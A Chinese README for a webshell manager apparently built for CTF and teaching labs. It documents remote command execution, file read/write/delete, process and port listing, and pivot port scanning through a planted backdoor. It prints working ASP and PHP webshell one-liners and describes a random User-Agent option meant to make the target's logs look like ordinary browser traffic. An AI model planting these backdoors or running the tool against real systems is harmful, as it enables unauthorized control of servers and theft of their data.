# weshell

CTF 靶场 / 教学场景下的 Webshell 管理端。单二进制，前端用 `embed` 内嵌，无外部依赖。

## 使用前提

**只能连接你自有或持有明确授权的教学/CTF 靶机。** 每次命令执行都会写入服务端审计日志。

## 边界

本项目**只实现**靶标管理与「HTTP 与马通信 + shell 命令执行与回显 + 靶机文件管理」；文件管理与系统/进程/端口/环境能力采集支持 php-eval、asp 与 asp-vbs 三种类型靶机。

刻意不做、也不会做：

- 流量加密、编码混淆、WAF 绕过、免杀
- 提权、持久化、内网横向
- 多马型适配（插件式套壳）

> 文件管理（列目录 / 读 / 写 / 删 / 上传 / 下载）、系统监控、进程列表、端口监听、环境能力研判已实现，对 php-eval、asp 与 asp-vbs 型靶机生效；管理端向靶机提交一小段 PHP / JScript / VBScript 代码完成采集，仍是明文通信。

通信为明文表单/查询串，便于直接抓包对照讲解。

## 构建与运行

```bash
go build -o weshell .
./weshell                                  # 默认监听 127.0.0.1:8080
./weshell -listen 0.0.0.0:8080 -user admin -pass '<强口令>'
```

启动参数：

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `-listen` | `127.0.0.1:8080` | 监听地址。监听非回环地址必须启用认证 |
| `-data` | `$HOME/.weshell/targets.json` | 靶标数据文件 |
| `-user` / `-pass` | 空 | Basic 认证凭据，需成对指定 |

> 安全兜底：本工具自身具备在靶机上执行命令的能力，因此在未启用认证时会拒绝监听非回环地址。

## 全局设置

管理端顶栏「全局设置」可对**所有靶机**统一设定请求的 User-Agent（保存后立即生效，持久化在 `data.json` 的 `settings` 字段）：

- **默认**：使用 `weshell/ctf-teaching` 标识。
- **指定固定 UA**：填写任意字符串，作为固定 `User-Agent` 发出。
- **随机**：每次请求从一组常见浏览器 UA 池里随机取一个，使靶机侧访问日志更接近正常浏览器流量。

该设置经 `/api/settings`（GET 读取、PUT 更新）落盘；`/api/config` 也会回传当前模式。

## HTTP 接口

| 方法 | 路径 | 说明 |
| --- | --- | --- |
| GET | `/api/kinds` | 支持的马型清单（含靶机侧样本） |
| GET | `/api/config` | 运行期配置（labUrl / 超时 / 全局 UA 模式） |
| GET / PUT | `/api/settings` | 全局设置：User-Agent 模式（默认 / 固定 / 随机），对所有靶机生效 |
| GET | `/api/targets` | 靶标列表 |
| POST | `/api/targets` | 新建靶标 |
| GET | `/api/targets/{id}` | 靶标详情 |
| PUT | `/api/targets/{id}` | 更新靶标 |
| DELETE | `/api/targets/{id}` | 删除靶标 |
| POST | `/api/targets/{id}/exec` | 执行命令，body `{"command":"whoami"}` |
| GET | `/api/targets/{id}/fs/list?path=` | 列出靶机目录（php-eval / asp 型） |
| GET | `/api/targets/{id}/fs/read?path=` | 读取文件，base64 回传（下载同此接口） |
| POST | `/api/targets/{id}/fs/write` | 写入/覆盖文件，body `{"path","base64"}`（上传同此接口） |
| POST | `/api/targets/{id}/fs/delete` | 删除文件/目录，body `{"path"}` |
| GET | `/api/targets/{id}/ports` | 监听端口列表（含 PID，php-eval / asp 型；解析 /proc/net/tcp 与 tcp6 或 netstat -ano） |
| GET | `/api/targets/{id}/scan?host=&ports=` | 端口扫描：在靶机上对目标主机做 TCP 探测，返回开放端口（php-eval / asp 型；fsockopen 或 WinHttpRequest） |
| GET | `/api/targets/{id}/headers` | 报文探查：向靶机发一次探测请求，返回管理端实际发出的请求头与靶机响应头，供教学观察真实流量（三种类型通用） |
| GET | `/api/targets/{id}/phpinfo` | 环境能力研判：php-eval 返回 PHP 信息（版本/禁用函数/open_basedir 等），asp 返回脚本引擎与关键 COM 组件可用性 |

## 靶标字段

| 字段 | 说明 |
| --- | --- |
| `name` | 显示名 |
| `url` | 马的 URL，需 http/https |
| `kind` | `php-eval`、`php-system`、`asp`（经典 ASP + JScript eval 型）或 `asp-vbs`（经典 ASP + VBScript execute 型） |
| `pass` | 参数名（即"密码"所在的键名） |
| `method` | `GET` 或 `POST` |
| `proxy` | 可选，访问该靶机的 HTTP 代理，支持 `http` / `https` / `socks5`（如 `http://127.0.0.1:8080`、`socks5://host:1080`）。留空则沿用环境代理（`HTTP_PROXY` 等） |
| `note` | 备注 |

## 载荷形态

`php-eval` 马提交的完整载荷（可在 Burp 里直接对照）：

```php
echo 'ws-<随机>';passthru('whoami 2>&1');echo 'ws-<随机>';
```

管理端按随机标记从响应中截取回显；命令默认追加 `2>&1`，便于把标准错误也显示出来。

`php-system` 马没有注入 PHP 的能力，因此直接提交命令原文，回显为响应体原文。

`asp` 马（经典 ASP + JScript 引擎）在靶机侧为一行 eval 入口：

```asp
<%eval(""+Request("pass"))%>
```

`asp-vbs` 马（经典菜刀一句话，VBScript 引擎）在靶机侧为一行 execute 入口，能力与上者对齐，只是管理端改提交 VBScript 代码：

```asp
<%execute request("pass")%>
```

> 新增靶标时「连接类型」选 `asp-vbs`，「参数名」与上述 `Request("pass")` 中的键名一致即可（示例用 `pass`，也可用 `x`、`chopper` 等）。

管理端向该参数提交一小段 JScript 代码：命令执行走 `WScript.Shell.Exec("cmd /c ...")`，文件管理走 `Scripting.FileSystemObject` / `ADODB.Stream`，系统/进程/端口采集走 WMI 与 `netstat -ano`，回显同样用随机标记截取。受限于 Windows，进程 CPU 百分比为 0、端口对应进程名留空。
